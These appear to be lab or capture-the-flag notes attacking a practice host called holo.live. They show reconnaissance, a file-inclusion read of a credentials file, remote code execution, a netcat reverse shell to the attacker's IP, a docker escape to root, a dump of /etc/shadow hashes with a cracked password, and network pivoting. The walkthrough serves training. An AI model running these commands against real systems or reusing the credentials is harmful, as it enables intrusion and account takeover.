## L-SRV01
IP: 10.200.111.33
* * *
## NMAP
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 47a528c37ffae5de41212fd204d19b1c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDgRlsYke+HMZK1LZslbBMJ/ZGHWxJAvZmM1yUiU1s8F5INQSAGyrrKavxtJnpB91+q3+I+BXNXNqHaIajeXy00RR9/xwoTR6l6Z3ukf8E4HWMkEbUW88w7AwmJou7oBcwjIhBGafbENbIPn0fgKuIdkAQb9969xO2ZWN2OSBHxeKfLbvEsHiCJE3l5Drs3mH0ZYTotrrHz/drdan47kA8LbutnVrBFazzfjawTxnahGsoF12dGZ5HBaVlV54cBQ2zGO6IJYD1pWr3qJpDIf4HSTyXndhtmWrWqAgNTj2TC8GCUVPXGo7XrAYor0wMiD/6/Dh6gDPgJOBOIggg6Oy1Bc8TAoph6bnTWySfjS+huTTE2/EBc0yS8Gcm7FOvAIbgZoeT2l0RFwGFIB0+b6WvDz+hDcRakUgB51MokjOmMo5PTdB6rZm+0cwgpAkIzJN6c+eRz8J8kxs5p6Wh5s3jhZV+1plbq/36SRtA1tnScCIkH6PefCbpVW2GWMxFCRac=
|   256 6d59463a07b1bba7b390031d7ee5d42a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1xYww6Qn+4W7TZvrmTtZymRAjTUDt6TdyFb0bGihSrbcA1jLk3qvU4nDnxkRHHb1tt6k51yPWeBtX2DsVzqJQ=
|   256 fb910ca0229a48947b748fd38d0a740b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4zmj6H7xXE81t4wxVk4aIaeT+0JdnNgi7edmMZoYqZ
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 21 disallowed entries
| /var/www/wordpress/index.php
| /var/www/wordpress/readme.html /var/www/wordpress/wp-activate.php
| /var/www/wordpress/wp-blog-header.php /var/www/wordpress/wp-config.php
| /var/www/wordpress/wp-content /var/www/wordpress/wp-includes
| /var/www/wordpress/wp-load.php /var/www/wordpress/wp-mail.php
| /var/www/wordpress/wp-signup.php /var/www/wordpress/xmlrpc.php
| /var/www/wordpress/license.txt /var/www/wordpress/upgrade
| /var/www/wordpress/wp-admin /var/www/wordpress/wp-comments-post.php
| /var/www/wordpress/wp-config-sample.php /var/www/wordpress/wp-cron.php
| /var/www/wordpress/wp-links-opml.php /var/www/wordpress/wp-login.php
|_/var/www/wordpress/wp-settings.php /var/www/wordpress/wp-trackback.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.5.3
|_http-title: holo.live
33060/tcp open  mysqlx? syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|_    HY000
* * *
## Subdomains
Seems like 3 are the subdomains, admin, dev and www
![6a4d8f8d04962a7805c80997d84613af.png](../../../_resources/6a4d8f8d04962a7805c80997d84613af.png)

* * *
## WebDirectories admin.holo.live
So far nothing nothing interesting except the robots.txt file
![b139e0ac13f967140dee13fe30809b35.png](../../../_resources/b139e0ac13f967140dee13fe30809b35.png)

Opening it:
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt

* * *
## WebDirectories dev.holo.live
![6a13858212e8787478fa8c66885849c5.png](../../../_resources/6a13858212e8787478fa8c66885849c5.png)
Dirsearch didn't retunerd much so I had to check manually the source code on the website and several pages where mentioned like index.php, about.php and talent.php.
This last one moving the mouse over showed a fourth php file called img.php

* * *
## WebDirectories www.holo.live
![9d8c9ffd11449d0823afd27abad45f16.png](../../../_resources/9d8c9ffd11449d0823afd27abad45f16.png)
So far we can see several folders pointing to admin areas, rouncube and phpmyadmin but the one interesting here is the robots.txt

Opening it:
User-Agent: *
Disallow: /var/www/wordpress/index.php
Disallow: /var/www/wordpress/readme.html
Disallow: /var/www/wordpress/wp-activate.php
Disallow: /var/www/wordpress/wp-blog-header.php
Disallow: /var/www/wordpress/wp-config.php
Disallow: /var/www/wordpress/wp-content
Disallow: /var/www/wordpress/wp-includes
Disallow: /var/www/wordpress/wp-load.php
Disallow: /var/www/wordpress/wp-mail.php
Disallow: /var/www/wordpress/wp-signup.php
Disallow: /var/www/wordpress/xmlrpc.php
Disallow: /var/www/wordpress/license.txt
Disallow: /var/www/wordpress/upgrade
Disallow: /var/www/wordpress/wp-admin
Disallow: /var/www/wordpress/wp-comments-post.php
Disallow: /var/www/wordpress/wp-config-sample.php
Disallow: /var/www/wordpress/wp-cron.php
Disallow: /var/www/wordpress/wp-links-opml.php
Disallow: /var/www/wordpress/wp-login.php
Disallow: /var/www/wordpress/wp-settings.php
Disallow: /var/www/wordpress/wp-trackback.php

Basically we know are point towards WP.

* * *
## LFI
We know from the source code that on http://dev.holo.live/talents.php images are called by img.php?file=xxxx
and we know that we have a credentials file path from admin.holo.live so we should try to read that file with LFI.

We can grab /etc/passwd:
![003f0d5fe057b862cddc71711aea2cc4.png](../../../_resources/003f0d5fe057b862cddc71711aea2cc4.png)

Let's try with  /var/www/admin/supersecretdir/creds.txt:
![d3033ff6c6cd82f2862775ddb82177f2.png](../../../_resources/d3033ff6c6cd82f2862775ddb82177f2.png)

And we have our irst set of credentials:
admin: DBManagerLogin!

Logging in and checking the HTML sourcecode of dashboard.php we can se a usefull comment:
![7799afa0c1e67b9b99f169f9cf401743.png](../../../_resources/7799afa0c1e67b9b99f169f9cf401743.png)

Which means if we don't give anything after /dashboard.php it will show file /tmp/views.txt otherwise it will execute code something like http://admin.holo.live/dashboard.php?cmd=id

We can even check that by fuzzing for parameters with FFUF:


Proof of execution with http://admin.holo.live/dashboard.php?cmd=id
![fc6d0f7a4ad677beb43de44594c444d8.png](../../../_resources/fc6d0f7a4ad677beb43de44594c444d8.png)

Now we can leverage our RCE(get a Revshell from PayloadAllTheThings)
![56a3255821572ae6cb901a8cdc64555f.png](../../../_resources/56a3255821572ae6cb901a8cdc64555f.png)
After several try and catch the reverse shell that worked was this one, we had to convert spaces in %20 since it's in URL convention: 
`nc%20-e%20/bin/sh%2010.50.108.156%205555`

Now we can stabilize our shell:
`python3 -c "import pty; pty.spawn('/bin/bash')"`

Continuing with L-SRV02.
* * *
## Internal Enumeration
Now uploading a linpeas.sh script and running it show us some PE vectors
![a70b5148f8f73a1c7235f7edc26992a2.png](../../../_resources/a70b5148f8f73a1c7235f7edc26992a2.png)
* * *
## Priviledge escalation
Checking in GTFOBins we can get a Root Shell by sending this command(we have SUID permissions on docker binary)
![f78755bcba051d4167addd675388a0bb.png](../../../_resources/f78755bcba051d4167addd675388a0bb.png)
Without having to upload a alpine image let's see what other images are already in place and try to use them since it doesn't matter what image you use as far you get a shell:
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounted-docker-socket-escape

We have ubuntu 18.04 image so we can use same command and escape the container:
![8f9819fb1672ffff00b0b6ee87b78f21.png](../../../_resources/8f9819fb1672ffff00b0b6ee87b78f21.png)

* * *
## Persistence
We can check /etc/shadow file and check if we can crack some passwords so we can get a ssh access directly to VM without relying on a poor revshell.

cat /etc/shadow
root:$6$TvYo6Q8EXPuYD8w0$Yc.Ufe3ffMwRJLNroJuMvf5/Telga69RdVEvgWBC.FN5rs9vO0NeoKex4jIaxCyWNPTDtYfxWn.EM4OLxjndR1:18605:0:99999:7:::
daemon:*:18512:0:99999:7:::
bin:*:18512:0:99999:7:::
sys:*:18512:0:99999:7:::
sync:*:18512:0:99999:7:::
games:*:18512:0:99999:7:::
man:*:18512:0:99999:7:::
lp:*:18512:0:99999:7:::
mail:*:18512:0:99999:7:::
news:*:18512:0:99999:7:::
uucp:*:18512:0:99999:7:::
proxy:*:18512:0:99999:7:::
www-data:*:18512:0:99999:7:::
backup:*:18512:0:99999:7:::
list:*:18512:0:99999:7:::
irc:*:18512:0:99999:7:::
gnats:*:18512:0:99999:7:::
nobody:*:18512:0:99999:7:::
systemd-network:*:18512:0:99999:7:::
systemd-resolve:*:18512:0:99999:7:::
systemd-timesync:*:18512:0:99999:7:::
messagebus:*:18512:0:99999:7:::
syslog:*:18512:0:99999:7:::
_apt:*:18512:0:99999:7:::
tss:*:18512:0:99999:7:::
uuidd:*:18512:0:99999:7:::
tcpdump:*:18512:0:99999:7:::
sshd:*:18512:0:99999:7:::
landscape:*:18512:0:99999:7:::
pollinate:*:18512:0:99999:7:::
ec2-instance-connect:!:18512:0:99999:7:::
systemd-coredump:!!:18566::::::
ubuntu:!$6$6/mlN/Q.1gopcuhc$7ymOCjV3RETFUl6GaNbau9MdEGS6NgeXLM.CDcuS5gNj2oIQLpRLzxFuAwG0dGcLk1NX70EVzUUKyUQOezaf0.:18601:0:99999:7:::
lxd:!:18566::::::
mysql:!:18566:0:99999:7:::
dnsmasq:*:18566:0:99999:7:::
linux-admin:$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:18570:0:99999:7:::

Unshadowing the file with unshadow holo_passwd.txt holo_shadow.txt > holo_unshadow.txt we can crack passwords with JohnTheRipper.
![0b154156ed8e915940a4ec67e8ca1017.png](../../../_resources/0b154156ed8e915940a4ec67e8ca1017.png)

linuxrulez       (linux-admin)

* * *
## Pivoting
Now we have a root access to L-SRV01 but we need to move forward, from our first enumeration we saw that we could not access the 10.200.111.1/24 network since we had only access to Docker environment on IP 192.168.100.100.
The solution is to use SSHuttle to route via ssh the whole 10.200.111.0/24 network
 sshuttle -r linux-admin@L-SRV01 10.200.111.0/24 -x L-SRV01
linux-admin@l-srv01's password:
c : Connected to server.

This command is basically using L-SRV01 as target, loggin in via ssh with the user/pass found in the previous task and then routing the whole 10.200.111.0/24 subnet. -X parameter is telling to SSHuttle to exclude L-SRV01 ip address itself so it doesn't kill the tunnel since starting point(L-SRV01) is in the same subnet.

Moving foward to ***S-SRV01***
* * *
